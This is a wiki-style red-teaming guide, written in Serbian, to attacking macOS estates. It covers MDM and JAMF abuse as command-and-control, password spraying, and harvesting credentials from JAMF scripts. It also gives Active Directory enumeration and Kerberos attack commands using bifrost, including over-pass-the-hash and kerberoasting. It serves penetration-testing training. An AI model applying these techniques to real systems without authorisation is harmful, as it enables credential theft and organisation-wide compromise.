# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Zloupotreba MDM-ova

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Ako uspete da **kompromitujete administratorske kredencijale** za pristup platformi za upravljanje, možete **potencijalno kompromitovati sve računare** distribucijom malware-a na uređaje.

Za red teaming u MacOS okruženjima veoma se preporučuje da razumete kako MDM-ovi funkcionišu:


{{#ref}}
macos-mdm/
{{#endref}}

### Korišćenje MDM-a kao C2

MDM će imati dozvolu da instalira, upituje ili uklanja profile, instalira aplikacije, kreira lokalne administratorske naloge, postavlja firmware password, menja FileVault ključ...

Da biste pokrenuli sopstveni MDM, potrebno je da **vaš CSR potpiše dobavljač**, što možete pokušati preko [**https://mdmcert.download/**](https://mdmcert.download/). Za pokretanje sopstvenog MDM-a za Apple uređaje možete koristiti [**MicroMDM**](https://github.com/micromdm/micromdm).

Upis u MDM **ne** čini automatski TLS sertifikat servera za upravljanje pouzdanim CA-om niti dodeljuje identitet za potpisivanje aplikacija. Ako server koristi privatni CA, njegov korenski i međusertifikati moraju biti uključeni u profil za upis ili u zaseban profil poverenja. Identitet klijenta koji se koristi za MDM autentifikaciju je drugi sertifikat.<sup>[[7]](#references)</sup>

Preuzeti profil za upis u MDM (`.mobileconfig`) mora da se otvori i odobri u **System Settings → General → Device Management**. Samo smeštanje profila u `.pkg` instaliran kao root ili ZIP datoteku otvorenu u Safariju neće neprimetno upisati aktuelni Mac. Pogledajte [ponašanje profila za konfiguraciju](../macos-auto-start-locations.md#configuration-profiles-mobileconfig).<sup>[[8]](#references)</sup>

Automated Device Enrollment tokom Setup Assistant-a je zaseban tok. Za drugačije preduslove pogledajte [neovlašćeni upis uređaja druge organizacije](macos-mdm/enrolling-devices-in-other-organisations.md).<sup>[[9]](#references)</sup>

**Mythic agent Orthrus** koristi ovu tehniku.

### Uvođenje paketa putem kontrolisanog MDM-a

Na **nadgledanom Mac-u koji koristi macOS 26 ili noviji**, kontrola nad MDM uslugom omogućava deklaraciju `com.apple.configuration.package` u sistemskom opsegu.<sup>[[10]](#references)</sup> Paket mora imati potpis koji uređaj može da proveri, ali njegova aplikacija ne mora imati zaseban Developer ID potpis: Gatekeeper ne proverava aplikacije instalirane putem upravljanja uređajima.<sup>[[11]](#references)</sup> Pouzdan TLS sertifikat servera sam po sebi ne daje operateru privatni ključ niti pravo korišćenja za potpisivanje potrebno za potpis paketa.<sup>[[11]](#references)[[12]](#references)</sup>

Napravite potpisani testni paket, izračunajte njegov digest i objavite paket i `ManifestURL` plist preko HTTPS-a. Manifestu je potreban jedan `software-package` resurs sa URL-om i SHA-256 vrednošću, kao i jedinstveni `bundle-identifier` i `bundle-version`.<sup>[[11]](#references)</sup> Zatim pošaljite deklaraciju paketa sa URL-om manifesta i postavite `InstallBehavior.Install` na `Required`; proverite stavku statusa `package.list` da biste videli da li je instalacija uspela ili je došlo do greške.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
pkgbuild --component ./Test.app --install-location /Applications --sign "Package Signing Certificate" ./Test.pkg
shasum -a 256 ./Test.pkg
```

Minimalna deklaracija obavezne instalacije, poslata putem MDM usluge, izgleda ovako (zamenite URL i oba UUID-a).<sup>[[10]](#references)</sup>

```json
{
  "Type": "com.apple.configuration.package",
  "Identifier": "11111111-1111-4111-8111-111111111111",
  "ServerToken": "22222222-2222-4222-8222-222222222222",
  "Payload": {
    "ManifestURL": "https://mdm.example.org/TestPackage.plist",
    "InstallBehavior": {"Install": "Required"}
  }
}
```

### Zloupotreba JAMF PRO

JAMF može da pokreće **custom scripts** (skripte koje je razvio sysadmin), **native payloads** (kreiranje lokalnih naloga, postavljanje EFI lozinke, nadgledanje datoteka/procesa...) i **MDM** (konfiguracije uređaja, sertifikati uređaja...).<sup>[[5]](#references)</sup>

#### JAMF samostalno upisivanje

Posetite stranicu poput `https://<company-name>.jamfcloud.com/enroll/` da biste proverili da li je omogućeno **samostalno upisivanje**. Ako jeste, možda će **tražiti pristupne podatke**.

Možete da upotrebite skriptu [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) za izvođenje password spraying napada.

Pored toga, nakon pronalaženja ispravnih pristupnih podataka možda ćete moći da izvršite brute-force napad na druga korisnička imena pomoću sledećeg obrasca:

![Zloupotreba JAMF PRO - JAMF samostalno upisivanje: Pored toga, nakon pronalaženja ispravnih pristupnih podataka možda ćete moći da izvršite brute-force napad na druga korisnička imena pomoću sledećeg obrasca](<../../images/image (107).png>)

#### JAMF autentifikacija uređaja

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Binarna datoteka **`jamf`** sadržala je tajnu za otvaranje keychain-a koja je u trenutku otkrića bila **zajednička** svima, a glasila je: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Pored toga, jamf se **održava** kao **LaunchDaemon** u **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Preuzimanje kontrole nad JAMF uređajem

**JSS** (Jamf Software Server) **URL** koji će **`jamf`** koristiti nalazi se u **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Ova datoteka u osnovi sadrži URL:

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://subdomain-company.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```

Dakle, napadač bi mogao da ubaci zlonamerni paket (`pkg`) koji **prepisuje ovu datoteku** prilikom instalacije, postavljajući **URL na Mythic C2 listener iz Typhon agenta**, kako bi mogao da zloupotrebi JAMF kao C2.

```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```

#### JAMF Impersonation

Da biste **imitirali komunikaciju** između uređaja i JMF-a, potrebno vam je:

- **UUID** uređaja: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **JAMF keychain** sa lokacije: `/Library/Application\ Support/Jamf/JAMF.keychain`, koji sadrži sertifikat uređaja

Pomoću ovih informacija **napravite VM** sa **ukradenim** Hardware **UUID-om** i isključenim **SIP-om**, ubacite **JAMF keychain**, postavite **hook** na Jamf **agent** i ukradite njegove informacije.

#### Krađa tajni

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Možete i da nadgledate lokaciju `/Library/Application Support/Jamf/tmp/` u potrazi za **custom scripts** koje administratori možda žele da izvrše putem Jamf-a, pošto se ovde **postavljaju, izvršavaju i uklanjaju**. Ove skripte **mogu sadržati kredencijale**.

Međutim, **kredencijali** se mogu proslediti ovim skriptama i kao **parametri**, pa bi trebalo da nadgledate `ps aux | grep -i jamf` (čak i ako niste root).

Skripta [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) može da osluškuje dodavanje novih datoteka i nove argumente procesa.

### Udaljeni pristup macOS-u

Takođe, o „posebnim“ **mrežnim** **protokolima** za **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

U nekim slučajevima ćete otkriti da je **MacOS računar povezan sa AD-om**. U tom slučaju, pokušajte da **enumerišete** Active Directory kao što ste navikli. Pomoć potražite na sledećim stranicama:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Jedan **lokalni MacOS alat** koji vam takođe može biti od pomoći je `dscl`:

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

Postoje i alati pripremljeni za MacOS koji automatski vrše enumeraciju AD-a i omogućavaju rad sa Kerberosom:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound je proširenje alata Bloodhound za auditing koje omogućava prikupljanje i unos Active Directory relacija sa MacOS hostova.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost je Objective-C projekat osmišljen za interakciju sa Heimdal krb5 API-jima na macOS-u. Cilj projekta je da omogući kvalitetnije bezbednosno testiranje Kerberosa na macOS uređajima pomoću nativnih API-ja, bez potrebe za dodatnim framework-ovima ili paketima na ciljnom sistemu.
- [**Orchard**](https://github.com/its-a-feature/Orchard): JavaScript for Automation (JXA) alat za enumeraciju Active Directory-ja.

### Informacije o domenu

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Korisnici

Postoje tri vrste MacOS korisnika:

- **Lokalni korisnici** — Njima upravlja lokalna OpenDirectory usluga i ni na koji način nisu povezani sa Active Directory-jem.
- **Mrežni korisnici** — Privremeni korisnici Active Directory-ja kojima je za autentifikaciju potrebna veza sa DC serverom.
- **Mobilni korisnici** — Korisnici Active Directory-ja sa lokalnom rezervnom kopijom svojih akreditiva i datoteka.

Lokalni podaci o korisnicima i grupama čuvaju se u fascikli _/var/db/dslocal/nodes/Default._\
Na primer, podaci o korisniku po imenu _mark_ čuvaju se u _/var/db/dslocal/nodes/Default/users/mark.plist_, a podaci o grupi _admin_ u _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Pored ivica HasSession i AdminTo, **MacHound dodaje tri nove ivice** u bazu podataka Bloodhound:<sup>[[2]](#references)</sup>

- **CanSSH** - entitet kome je dozvoljen SSH pristup hostu
- **CanVNC** - entitet kome je dozvoljen VNC pristup hostu
- **CanAE** - entitet kome je dozvoljeno izvršavanje AppleEvent skripti na hostu

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

Više informacija na [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Lozinka za Computer$

Preuzmite lozinke pomoću:

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

Moguće je pristupiti lozinci **`Computer$`** u System keychain-u.

### Over-Pass-The-Hash

Nabavite TGT za određenog korisnika i servis:

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

Kada se prikupi TGT, moguće ga je ubaciti u trenutnu sesiju pomoću:

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

Sa pribavljenim servisnim tiketima moguće je pokušati da se pristupi deljenim resursima na drugim računarima:

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Pristup Keychain-u

Keychain vrlo verovatno sadrži osetljive informacije koje bi, ako im se pristupi bez izazivanja prompta, mogle pomoći u napredovanju red team vežbe:


{{#ref}}
macos-keychain.md
{{#endref}}

## Eksterne usluge

MacOS Red Teaming se razlikuje od uobičajenog Windows Red Teaming-a jer je **MacOS obično direktno integrisan sa nekoliko eksternih platformi**. Uobičajena konfiguracija MacOS-a podrazumeva pristup računaru pomoću **sinhronizovanih OneLogin akreditiva i pristupanje različitim eksternim uslugama** (kao što su github, aws...).

## Razne Red Team tehnike

### Safari

Kada se datoteka preuzme u Safariju, ako je „bezbedna“, biće **automatski otvorena**. Na primer, ako **preuzmete zip**, on će automatski biti dekompresovan:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>



## References

- [1] [Branje Apple plodova: Red Teaming MacOS okruženja 2021. godine - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Predstavljamo MacHound: rešenje za napade zasnovane na macOS Active Directory-ju](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Komande za enumeraciju domena (ekvivalenti za dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Dođite na tamnu stranu, imamo jabuke: pretvaranje macOS upravljanja u zlo](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: „Perspektiva napadača na Jamf konfiguracije“ - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Otkrivanje Active Directory-ja pomoću Mac-a - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [7] [Apple — Upravljanje sertifikatima za usluge i uređaje za upravljanje uređajima](https://developer.apple.com/documentation/devicemanagement/managing-certificates-for-device-management-services-and-devices)
- [8] [Apple — Korišćenje konfiguracionih profila na Mac-u](https://support.apple.com/en-gb/guide/mac-help/mh35561/mac)
- [9] [Apple — Primena profila za upis u upravljanje uređajima](https://developer.apple.com/documentation/devicemanagement/deploying-device-management-enrollment-profiles)
- [10] [Apple — Deklaracija paketa](https://developer.apple.com/documentation/devicemanagement/package)
- [11] [Apple — Instaliranje paketa](https://developer.apple.com/documentation/devicemanagement/installing-packages)
- [12] [Apple — Identiteti](https://developer.apple.com/documentation/security/identities)
{{#include ../../banners/hacktricks-training.md}}
